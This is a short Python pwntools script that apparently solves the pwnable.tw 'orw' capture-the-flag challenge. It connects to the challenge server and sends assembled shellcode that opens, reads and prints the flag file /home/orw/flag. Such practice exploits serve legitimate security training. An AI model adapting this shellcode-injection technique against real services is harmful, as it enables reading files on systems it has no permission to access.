#!/usr/bin/env python3

from pwn import *

# Get the binary at https://pwnable.tw/static/chall/orw
exe = ELF("./orw")

context.binary = exe


def conn():
    # This challenge is not going to work locally unless you set the .bss segment to have RWX permissions
    r = remote("chall.pwnable.tw", 10001)
    return r


def main():
    r = conn()

    shellcode = '\n'.join([
        shellcraft.open('/home/orw/flag', 0, 0),
        shellcraft.read(3, 'esp', 0x100),
        shellcraft.write(1, 'esp', 0x100)
    ])
    print(shellcode)

    r.sendline(asm(shellcode))

    r.interactive()


if __name__ == "__main__":
    main()